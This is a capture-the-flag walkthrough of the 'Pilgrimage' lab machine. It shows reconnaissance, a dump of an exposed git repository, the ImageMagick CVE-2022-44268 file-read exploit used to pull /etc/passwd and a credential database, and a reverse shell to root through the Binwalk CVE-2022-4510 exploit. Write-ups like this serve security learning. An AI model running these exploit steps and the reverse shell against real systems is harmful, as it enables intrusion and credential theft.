Nmap reveals a webpage and that it has a  .git.

```
──╼ [★]$ nmap pilgrimage.htb -sC -A -T4 -A -Pn
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-29 22:30 BST
Nmap scan report for pilgrimage.htb (10.129.183.130)
Host is up (0.074s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 20be60d295f628c1b7e9e81706f168f3 (RSA)
|   256 0eb6a6a8c99b4173746e70180d5fe0af (ECDSA)
|_  256 d14e293c708669b4d72cc80b486e9804 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Pilgrimage - Shrink Your Images
| http-git: 
|   10.129.183.130:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Pilgrimage image shrinking service initial commit. # Please ...
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Run git-dumper to get all of the files.

```
└──╼ [★]$ git-dumper http://pilgrimage.htb/.git/ DIR
```


```
└──╼ [★]$ ls
assets  dashboard.php  index.php  login.php  logout.php  magick  register.php  vendor
```

Checking the magick verison we can find an exploit to run.

```
└──╼ [★]$ ./magick -version
Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (7.5)
```

https://www.metabaseq.com/imagemagick-zero-days/


https://github.com/voidz0r/CVE-2022-44268

```
└──╼ [★]$ sudo pip3 install pypng
Collecting pypng
  Downloading pypng-0.20220715.0-py3-none-any.whl (58 kB)
     |████████████████████████████████| 58 kB 4.3 MB/s 
Installing collected packages: pypng
Successfully installed pypng-0.20220715.0
```

```
└──╼ [★]$ sudo python3 generate.py -f "/etc/passwd" -o exploit1

   [>] ImageMagick LFI PoC - by Sybil Scan Research <research@sybilscan.com>
   [>] Generating Blank PNG
   [>] Blank PNG generated
   [>] Placing Payload to read /etc/passwd
   [>] PoC PNG generated > exploit1
```

└──╼ [★]$ sudo wget http://pilgrimage.htb/shrunk/64a32325a387c.png
--2023-07-03 20:36:46--  http://pilgrimage.htb/shrunk/64a32325a387c.png
Resolving pilgrimage.htb (pilgrimage.htb)... 10.129.150.112
Connecting to pilgrimage.htb (pilgrimage.htb)|10.129.150.112|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1688 (1.6K) [image/png]
Saving to: ‘64a32325a387c.png’

64a32325a387c.png   100%[===================>]   1.65K  --.-KB/s    in 0s      

2023-07-03 20:36:46 (195 MB/s) - ‘64a32325a387c.png’ saved [1688/1688]


└──╼ [★]$ exiftool 64a32325a387c.png -b
Warning: [minor] Text chunk(s) found after PNG IDAT (may be ignored by some readers) - 64a32325a387c.png
12.1664a32325a387c.png.16882023:07:03 20:36:05+01:002023:07:03 20:37:46+01:002023:07:03 20:36:46+01:00644PNGPNGimage/png128128820002.20.31270.3290.640.330.30.60.150.06255 255 2552023:07:03 19:36:05

    1437
726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d
6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f
6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e
2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f736269
6e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f
62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d
65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a
2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a
783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f
6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f757372
2f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73
706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31
303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f
6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573
722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d
646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b
75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f
7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c69
7374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67
696e0a6972633a783a33393a33393a697263643a2f72756e2f697263643a2f7573722f73
62696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d
5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e
6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a3635353334
3a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e
2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374
656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d6e6574776f72
6b3a783a3130313a3130323a73797374656d64204e6574776f726b204d616e6167656d65
6e742c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e
0a73797374656d642d7265736f6c76653a783a3130323a3130333a73797374656d642052
65736f6c7665722c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f
6c6f67696e0a6d6573736167656275733a783a3130333a3130393a3a2f6e6f6e65786973
74656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d74696d6573
796e633a783a3130343a3131303a73797374656d642054696d652053796e6368726f6e69
7a6174696f6e2c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c
6f67696e0a656d696c793a783a313030303a313030303a656d696c792c2c2c3a2f686f6d
652f656d696c793a2f62696e2f626173680a73797374656d642d636f726564756d703a78
3a3939393a3939393a73797374656d6420436f72652044756d7065723a2f3a2f7573722f
7362696e2f6e6f6c6f67696e0a737368643a783a3130353a36353533343a3a2f72756e2f
737368643a2f7573722f7362696e2f6e6f6c6f67696e0a5f6c617572656c3a783a393938
3a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c73650a
[minor] Text chunk(s) found after PNG IDAT (may be ignored by some readers)2023-07-03T19:36:05+00:002023-07-03T19:36:05+00:002023-07-03T19:36:05+00:00128 1280.016384

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
emily:x:1000:1000:emily,,,:/home/emily:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false


└──╼ [★]$ less login.php


```php
<?php
session_start();
if(isset($_SESSION['user'])) {
  header("Location: /dashboard.php");
  exit(0);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_POST['username'] && $_POST['password']) {
  $username = $_POST['username'];
  $password = $_POST['password'];

  $db = new PDO('sqlite:/var/db/pilgrimage');
  $stmt = $db->prepare("SELECT * FROM users WHERE username = ? and password = ?");
  $stmt->execute(array($username,$password));
```

└──╼ [★]$ sudo python3 generate.py -f "/var/db/pilgrimage" -o exploit2.png

   [>] ImageMagick LFI PoC - by Sybil Scan Research <research@sybilscan.com>
   [>] Generating Blank PNG
   [>] Blank PNG generated
   [>] Placing Payload to read /var/db/pilgrimage
   [>] PoC PNG generated > exploit2.png


└──╼ [★]$ sudo wget http://pilgrimage.htb/shrunk/64a324799638f.png
--2023-07-03 20:41:58--  http://pilgrimage.htb/shrunk/64a324799638f.png
Resolving pilgrimage.htb (pilgrimage.htb)... 10.129.150.112
Connecting to pilgrimage.htb (pilgrimage.htb)|10.129.150.112|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1748 (1.7K) [image/png]
Saving to: ‘64a324799638f.png’

64a324799638f.png   100%[===================>]   1.71K  --.-KB/s    in 0s      

2023-07-03 20:41:58 (215 MB/s) - ‘64a324799638f.png’ saved [1748/1748]


└──╼ [★]$ exiftool 64a324799638f.png  -b
Warning: [minor] Text chunk(s) found after PNG IDAT (may be ignored by some readers) - 64a324799638f.png
12.1664a324799638f.png.17482023:07:03 20:41:45+01:002023:07:03 20:41:58+01:002023:07:03 20:41:58+01:00644PNGPNGimage/png128128820002.20.31270.3290.640.330.30.60.150.06255 255 2552023:07:03 19:41:45


d02031915726f6775653170617373180103172d65
6d696c796162696763686f6e6b79626f693132330a000000020fec000ff70fec

Ð 1W&öwVS711rÖmilyabigchonkyboi123


a031901726f6775
65310208031709656d696c790d000000020f74000fba0f74

 1&öwe1	emily

└──╼ [★]$ ssh pilgrimage.htb -l emily
emily@pilgrimage.htb's password: 
Linux pilgrimage 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
emily@pilgrimage:~$ 

```
emily@pilgrimage:~$ cat user.txt 
d0663dd014**********************
```

After running linpeas we find malwarescan.sh that looks suspicious.

```
emily@pilgrimage:/tmp$ cat  /usr/sbin/malwarescan.sh 
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
	filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
	binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
		if [[ "$binout" == *"$banned"* ]]; then
			/usr/bin/rm "$filename"
			break
		fi
	done
done
```

Further anaylysis shows that it is executing binwalk and if we check binwalk we can find its version number that has an exploit for it.
```
emily@pilgrimage:/tmp$ binwalk -h

Binwalk v2.3.2
Craig Heffner, ReFirmLabs
https://github.com/ReFirmLabs/binwalk
```

Follow the directions and transfer the exploit to the victim.

https://www.exploit-db.com/exploits/51249

```
emily@pilgrimage:/tmp$ python3 51249.py /var/www/pilgrimage.htb/shrunk/64a3308894bdb.png 10.10.14.130 555
```

After transferring any image, run the exploit

```
mily@pilgrimage:/tmp$ python3 51249.py exploit1.png 10.10.14.130 555

################################################
------------------CVE-2022-4510----------------
################################################
--------Binwalk Remote Command Execution--------
------Binwalk 2.1.2b through 2.3.2 included-----
------------------------------------------------
################################################
----------Exploit by: Etienne Lacoche-----------
---------Contact Twitter: @electr0sm0g----------
------------------Discovered by:----------------
---------Q. Kaiser, ONEKEY Research Lab---------
---------Exploit tested on debian 11------------
################################################


You can now rename and share binwalk_exploit and start your local netcat listener.
```

Transfer the image back into the pilgrimage.htb shrunk folder

```
emily@pilgrimage:/tmp$ cp binwalk_exploit.png /var/www/pilgrimage.htb/shrunk/
```

The listener should now capture the connection and we can grab the flag.

``` 
└──╼ [★]$ sudo nc -lvnp 555
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::555
Ncat: Listening on 0.0.0.0:555
Ncat: Connection from 10.129.150.112.
Ncat: Connection from 10.129.150.112:57650.
id
uid=0(root) gid=0(root) groups=0(root)
ls
_64a3308894bdb.png.extracted
_binwalk_exploit.png.extracted
pwd
/root/quarantine
cd ..
ls
quarantine
reset.sh
root.txt
cat root.txt
008cf8733502********************
```

